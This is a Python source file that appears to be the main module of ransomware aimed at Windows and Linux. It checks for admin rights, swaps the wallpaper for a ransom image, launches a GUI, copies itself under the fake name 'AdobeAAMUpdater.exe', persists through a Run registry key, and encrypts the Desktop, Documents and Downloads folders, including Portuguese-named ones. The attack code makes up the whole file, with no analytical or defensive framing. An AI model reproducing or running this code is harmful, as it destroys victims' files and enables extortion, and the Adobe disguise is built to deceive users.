from Functions.Encrypt_Func import Crypt,k,s
from ctypes import windll
from os import path,getenv,startfile
from sys import argv,exit
from shutil import copyfile
from winreg import *

if(Crypt.check_if_is_admin()==False):
	sys.exit(1)

if s=='Windows':
	RainWarning()

	desktop = path.expanduser('~/Desktop')
	documents = path.expanduser('~/Documents')
	downloads = path.expanduser('~/Downloads')

	Crypt.check_w_key(documents)

	bg = Crypt.resource_path('bg.jpg')
	Crypt.resource_path('GUI.exe')

	try:
		appdt = getenv('APPDATA')
		copyfile(appdt+'/Microsoft/Windows/Themes/TranscodedWallpaper',appdt+'/Microsoft/Windows/Themes/.transold')
	except:
		pass
	finally:
		try:
			windll.user32.SystemParametersInfoW(20,0,bg,0)
		except:
			pass

	startfile('GUI.exe')

	keypath = r'SOFTWARE\Microsoft\Windows\CurrentVersion\Run'
	try:
		key = CreateKey(HKEY_LOCAL_MACHINE, keypath)
	except PermissionError:
		try:
			key = CreateKey(HKEY_CURRENT_USER, keypath)
		except:
			pass
	
	try:
		copyfile(argv[0],'C:/Users/Public/AdobeAAMUpdater.exe')
		p = 'C:\\Users\\Public\\AdobeAAMUpdater.exe'
		SetValueEx(key, "AdobeAAM", 0, REG_SZ, p)
	except:
		pass
	finally:
		CloseKey(key)

	Crypt.c_iterator(desktop)
	Crypt.c_iterator(documents)
	Crypt.c_iterator(downloads)

	Crypt.infectall()
	
elif s=='Linux':
	desktop = path.expanduser('~/Desktop')
	documents = path.expanduser('~/Documents')
	downloads = path.expanduser('~/Downloads')
	area = path.expanduser('~/Área de trabalho')
	documentos = path.expanduser('~/Documentos')

	try:
		with open(documents+'/.officek','wb') as key:
			key.write(k)
	except:
		try:
			with open(documentos+'/.officek','wb') as key:
				key.write(k)
		except:
			pass

	Crypt.c_iterator(desktop)
	Crypt.c_iterator(area)
	Crypt.c_iterator(documents)
	Crypt.c_iterator(documentos)
	Crypt.c_iterator(downloads)

	Crypt.infectall()